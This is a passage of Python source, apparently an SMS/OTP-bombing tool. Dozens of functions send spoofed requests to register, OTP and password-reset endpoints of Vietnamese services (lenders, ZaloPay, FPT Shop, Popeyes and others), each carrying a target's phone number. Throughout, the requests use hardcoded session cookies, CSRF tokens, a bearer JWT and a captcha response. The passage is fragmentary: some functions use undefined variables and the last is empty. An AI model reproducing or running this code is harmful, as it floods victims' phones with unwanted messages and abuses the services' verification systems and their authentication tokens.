    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)
###

def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)

def call1(phone):
    requests.post("https://api.vayvnd.vn/v1/users/password-reset", headers={"Host": "api.vayvnd.vn","content-length": "22","accept": "application/json","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://vayvnd.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vayvnd.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"login":"0"+phone[1:11]})).text
###
def call2(phone):
    requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts", headers={"Host": "api.tamo.vn","content-length": "39","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://www.tamo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.tamo.vn/","accept-encoding": "gzip, deflate, br"}, json=({"mobilePhone":{"number":"0"+phone[1:11]}})).text
###
def call3(phone):
    requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers={"Host": "api.senmo.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"104\", \" Not A;Brand\";v\u003d\"99\", \"Google Chrome\";v\u003d\"104\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://senmo.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://senmo.vn/user/login","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"phone":"84"+phone[1:11]})).text
###
def call4(phone):
    Headers = {"Host": "atmonline.com.vn","content-length": "46","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json","sec-ch-ua-mobile": "?1","authorization": "","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://atmonline.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://atmonline.com.vn/portal-new/login?mobilePhone\u003d0777531398\u0026requestedAmount\u003d4000000\u0026requestedTerm\u003d4\u0026locale\u003dvn\u0026designType\u003dNEW","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_181P8FC3KD\u003dGS1.1.1681739176.1.1.1681739193.43.0.0"}
    Datason = json.dumps({"mobilePhone": phone,"source":"ONLINE"})
    response = requests.post("https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",  data=Datason, headers=Headers)
###
def call5(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)
###
def call9(phone):
  cookies = {
    'supportOnlineTalkID':
    'Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6',
    '__cfruid':
    'f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280',
    'XSRF-TOKEN':
    'eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D',
    'sessionid':
    'eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D',
    'utm_uid':
    'eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D',
    'ec_cache_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_cache_client':
    'false',
    'ec_cache_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_png_client':
    'false',
    'ec_png_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client':
    'false',
    'ec_png_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'ec_etag_utm':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'ec_etag_client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'uid':
    '2ecb18ca-827d-53c1-5f1a-7d106859d9e5',
    'client':
    'false',
    'client_utm':
    '%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
  }

  headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'supportOnlineTalkID=Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6; __cfruid=f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280; XSRF-TOKEN=eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D; ec_cache_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_png_client=false; ec_png_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; ec_etag_utm=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; ec_etag_client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D; uid=2ecb18ca-827d-53c1-5f1a-7d106859d9e5; client=false; client_utm=%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D',
    'origin': 'https://robocash.vn',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'phone': phone,
    '_token': 'iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I',
  }

  requests.post('https://robocash.vn/register/phone-resend',
                cookies=cookies,
                headers=headers,
                data=data)
                
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id            
def zlpay(phone):
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': "0"+phone[1:11],'send_otp_token': token}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data).text     

def vntrip(phone):
    response_vntrip = requests.post('https://micro-services.vntrip.vn/core-user-service/verification/request/phone', headers=ua, json=json_data).text
###
def pop(phone):
    requests.post("https://products.popsww.com/api/v5/auths/register", headers={"Host": "products.popsww.com","content-length": "89","profileid": "62e58a27c6f857005396318f","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6InI1aTZqN3dUTERBS3hMV3lZcDdaM2ZnUUJKNWk3U2tmRkJHR2tNNUlCSlYycFdiRDNwbVd1MUM2eTQyVHJRaUIiLCJ1c2VySWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGUiLCJyb2xlcyI6WyJHVUVTVCJdLCJwcm9maWxlcyI6W3siaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOGYiLCJhZ2UiOjEzLCJtcGFhIjp7ImlkIjoiNWQyM2UxMjU5NTI1MWI5OGJkMDQzMzc2IiwiYWdlIjoxM319LHsiaWQiOiI2MmU1OGEyN2M2Zjg1NzAwNTM5NjMxOTAiLCJhZ2UiOjcsIm1wYWEiOnsiaWQiOiI1ZDIzZTFlMjk1MjUxYjk4YmQwNDM0MWQiLCJhZ2UiOjd9fV0sImlhdCI6MTY1OTIxMDI3OSwiZXhwIjoxOTc0NTcwMjc5fQ.3exZEvv0YG1Uw0UYx2Mt9Oj3NhRb8BX-l4tIAcVv9gw","x-env": "production","content-type": "application/json","lang": "vi","sub-api-version": "1.1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","api-key": "5d2300c2c69d24a09cf5b09b","platform": "wap","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://pops.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://pops.vn/auth/signin-signup/signup?isOffSelectProfile\u003dtrue","accept-encoding": "gzip, deflate, br"}, json=({"fullName":"","account": phone,"password":"Abcxaxgh","confirmPassword":"Abcxaxgh"})).text
###
def poy(phone):
    cookies = {
        '_gcl_au': '1.1.1399171366.1685593865',
        '_gid': 'GA1.2.601043050.1685593865',
        '_gat_UA-106834068-1': '1',
        '_gat_UA-149855316-1': '1',
        '_ga': 'GA1.1.1352914107.1685593865',
        '_ga_Y4V7XHSR6R': 'GS1.1.1685593865.1.0.1685593865.0.0.0',
        '__admUTMtime': '1685593865',
        '__uidac': '3060068c024c57cf5bccf43037278ef8',
        '__iid': '',
        '__su': '0',
        '_fbp': 'fb.1.1685593872828.2142938916',
        '_ga_4YCG78W1LS': 'GS1.1.1685593865.1.1.1685593885.0.0.0',
        '_ga_X3WSB3MZGL': 'GS1.1.1685593865.1.1.1685593885.40.0.0',
    }

    headers = {
        'authority': 'api.popeyes.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1399171366.1685593865; _gid=GA1.2.601043050.1685593865; _gat_UA-106834068-1=1; _gat_UA-149855316-1=1; _ga=GA1.1.1352914107.1685593865; _ga_Y4V7XHSR6R=GS1.1.1685593865.1.0.1685593865.0.0.0; __admUTMtime=1685593865; __uidac=3060068c024c57cf5bccf43037278ef8; __iid=; __su=0; _fbp=fb.1.1685593872828.2142938916; _ga_4YCG78W1LS=GS1.1.1685593865.1.1.1685593885.0.0.0; _ga_X3WSB3MZGL=GS1.1.1685593865.1.1.1685593885.40.0.0',
        'origin': 'https://popeyes.vn',
        'referer': 'https://popeyes.vn/',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'x-client': 'WebApp',
    }

    json_data = {
        'phone': phone,
        'firstName': 'to',
        'lastName': 'lon xinh',
        'email': 'hihi@gmail.com',
    }

    response = requests.post('https://api.popeyes.vn/api/v1/register', cookies=cookies, headers=headers, json=json_data)
    
def alfres(phone):
    requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture\u003dvi-VN", headers={"Host": "api.alfrescos.com.vn","content-length": "124","accept-language": "vi-VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","accept": "application/json, text/plain, */*","brandcode": "ALFRESCOS","devicecode": "web","sec-ch-ua-platform": "\"Android\"","origin": "https://alfrescos.com.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://alfrescos.com.vn/","accept-encoding": "gzip, deflate, br"}, json=({"phoneNumber": phone,"secureHash":"add789229e0794d8508f948dacd710ae","deviceId":"","sendTime":1660806807513,"type":2})).text
###
def tv360(phone):
    requests.post("http://m.tv360.vn/public/v1/auth/get-otp-login", headers={"Host": "m.tv360.vn","Connection": "keep-alive","Content-Length": "23","Accept": "application/json, text/plain, */*","User-Agent": "Mozilla/5.0 (Linux; Android 10; moto e(7i) power Build/QOJ30.500-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36","Content-Type": "application/json","Origin": "http://m.tv360.vn","Referer": "http://m.tv360.vn/login?r\u003dhttp%3A%2F%2Fm.tv360.vn%2F","Accept-Encoding": "gzip, deflate"}, json=({"msisdn":"0"+phone[1:11]})).text
###
def loship(phone):
    requests.post("https://latte.lozi.vn/v1.2/auth/register/phone/initial", headers={"Host": "latte.lozi.vn","content-length": "101","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn/","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]})).text
###
    
def oldloship   (phone):
    response = requests.post("https://mocha.lozi.vn/v6/invites/use-app", headers={"Host": "mocha.lozi.vn","content-length": "47","x-city-id": "50","accept-language": "vi_VN","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","content-type": "application/json","x-lozi-client": "1","x-access-token": "unknown","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://loship.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://loship.vn","accept-encoding": "gzip, deflate, br"}, data=json.dumps({"device":"Android 8.1.0","platform":"Chrome/104.0.0.0","countryCode":"84","phoneNumber":phone[1:11]}))
###
def fpt(phone):
    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
#$#
def f88(phone):
    requests.post("https://apigateway.f88.vn/services/appvay/api/onlinelending/VerifyOTP/sendOTP", headers={"Host": "apigateway.f88.vn","content-length": "595","content-encoding": "gzip","traceparent": "00-c7d4ad181d561015110814044adf720e-d3fed9b4added2cf-01","sec-ch-ua-mobile": "?1","authorization": "Bearer null","content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","accept": "*/*","origin": "https://online.f88.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://online.f88.vn/","accept-encoding": "gzip, deflate, br"}, json={"phoneNumber":"0"+phone[1:11],"recaptchaResponse":"03ANYolqvEe93MY94VJjkvDUIsq6ysACNy1tsnG1xnFq9YLY1gyez-_QvS0YEsxe9D0ddnuXKmlrbWqvT3KTQD2Bhx9yLeQ6M-nzUChGrqS08GEhHIdCpl3JLvHctZYeX18O8qZqcHY-e7qHq1WG7kkPbykyx9KwxMDnzW3j1N0KymuMti1Z0WAUgXHDh-ifJvI3n4lp5Tzsq5k1Nswugf0X3HFexHAm9GACImJIDG46QRucLBRm0df6jfazibClJyKlLXdvnqmrjCt6Wy22C_h-RY9Iilj5Lcy9rawUShIMJoCFX08UOWP_llCE4T5h5kuUk1llSgu9pdHMK2T6OuEROwXt2begTITv-9l534brGibKVlwwbxLtfHWohLRYQC-tjYWWq7avFLPOA9d53_72KLKoYAuKjvqKul683bQ7HtEzZ-eK3VCiBQj1Za1EV3R69e648tCkNkGXr9kpr1n0ccGeNbXSuB3GHQQGPnDIGuYgalvKa77_iX68OQ90PouP2GeT_RvBY3","source":"Online"}).text                                 

def oldzalopay(phone):
    headers = {'Host': 'api.zalopay.vn','x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1','x-device-model': 'iPhone8,2','x-density': 'iphone3x','authorization': 'Bearer ','x-device-os': 'IOS','x-drsite': 'off','accept': '*/*','x-app-version': '7.13.1','accept-language': 'vi-VN;q=1.0, en-VN;q=0.9','user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2','x-platform': 'NATIVE','x-os-version': '14.6',}
    params = {'phone_number': phone,}
    token = requests.get('https://api.zalopay.vn/v2/account/phone/status', params=params, headers=headers).json()['data']['send_otp_token']
    json_data = {'phone_number': phone,'send_otp_token': token,}
    response = requests.post('https://api.zalopay.vn/v2/account/otp', headers=headers, json=json_data)

def thantaioi(phone):
    Headers = {"Host": "api.thantaioi.vn","content-length": "23","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","content-type": "application/json","accept-language": "vi","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","accept": "*/*","origin": "https://thantaioi.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://thantaioi.vn/user/login","accept-encoding": "gzip, deflate, br","cookie": "_ga_LBS7YCVKY6\u003dGS1.1.1681807570.2.1.1681807596.34.0.0"}
    Datason = json.dumps({"phone": f"84{phone[1:11]}"})
    response = requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", data=Datason, headers=Headers)

def oldsenmo(phone):
